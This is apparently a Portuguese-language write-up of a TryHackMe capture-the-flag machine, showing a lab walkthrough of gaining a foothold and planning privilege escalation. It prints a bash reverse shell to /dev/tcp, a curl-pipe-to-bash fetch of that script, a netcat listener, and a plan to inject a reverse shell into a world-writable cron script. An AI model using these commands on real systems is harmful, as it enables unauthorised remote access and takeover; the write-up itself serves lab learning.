# 🛡️ Exploração da Máquina — 0ff3ns!v3 S3cur!ty - Sw4gg3r

## 🔗 Links

- 💻 **Máquina:** [Google Drive - Máquina](https://drive.google.com/file/d/1XsuWUulDDdktnV6fpPgRIH172iASvVmz/view)
- 🔍 **Prova:** [TryHackMe - 0ff3ns!v3 S3cur!ty - Sw4gg3r](https://tryhackme.com/room/0ff3nsv3s3curtysw4gg3r)

---

## ⚠️ Obs: Desligar o antivírus

### 💡 A máquina parece ter o `curl`. Dá pra subir um arquivo shell usando um servidor Python, baixar com `curl`, executar e escutar a resposta do outro lado.

![image](https://github.com/user-attachments/assets/9de29dba-6b94-4492-9d84-54b28b5408e3)

### 📄 Conteúdo do arquivo `shell_2.sh`:

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.100.168/4444 0>&1
```

### 🚀 Dentro dessa pasta, vamos subir o servidor Python para baixar com o curl:

![image](https://github.com/user-attachments/assets/ce117679-c08a-4e7b-90c8-79057e4d97db)

---

### 🌐 No site, usamos o comando `curl` para baixar o arquivo e em seguida já executá-lo:

```bash
curl http://[IP]:[PORTA]/shell_2.sh | bash
```

![image](https://github.com/user-attachments/assets/c0bba9e9-88df-4021-b2c9-9c3276935111)

### Confirmação : ::ffff:192.168.100.207 - - [21/May/2025 02:49:03] "GET /shell_2.sh HTTP/1.1" 200

### 📡 Em outro terminal, deixamos o listener pronto com:

```bash
nc -nlvp 4444
```

![image](https://github.com/user-attachments/assets/c3e6ad67-6e91-4442-a4e9-6196b32a58e2)

---

### ✅ Shell recebido! Agora é hora de fazer pós-exploração e escalar privilégios.

#### Acesso à máquina com usuário `www-data`:

---

### 🗂️ Aqui estão todos os arquivos encontrados com fuzzing. Agora vamos explorá-los em busca de algo útil.
![image](https://github.com/user-attachments/assets/a200a374-0976-4250-b338-69ea9889edbb)
### Dentro da pasta `/opt`, encontramos um script `.sh` que é executado via cron a cada minuto:

![image](https://github.com/user-attachments/assets/854a11c4-a51e-4e55-85b3-e3faf37ec0c1)

### 🔍 Entendendo o que ocorre dentro do script:

![image](https://github.com/user-attachments/assets/a5f88153-c1f1-40fa-88f6-4e6f5c855d4d)

---

## Oque é preciso entender para escalar o previlegio:
```txt
  ### -rwxrwxrwx  1 user-swagger user-swagger  184 Jun  1  2023 script.sh
  
  Fazendo a analine desse arquivo podemos ver que ele deu um chmod 777 
  ,que dizer que todos como root , todos os grupos e convidados tem acesso 
  a escrita execução e leitura do arquivo .sh que é um indicio que é por 
  aqui o caminho , ainda por cima o dono do arquivo é o swagger
      
  Mas tem o problema de estarmos com o usuario wwwdata que é limitado para escalar  
  previlegio de root precisamos do arquivo que tem previlegios do usuario swagger
  que é literalmente este arquivo

  Para Conseguir entrar no user dele podemos usar o script que ele criou contra ele mesmo
  e colocar um shell reverse para entrar da nossa maquina no perfil de usuario dele

```
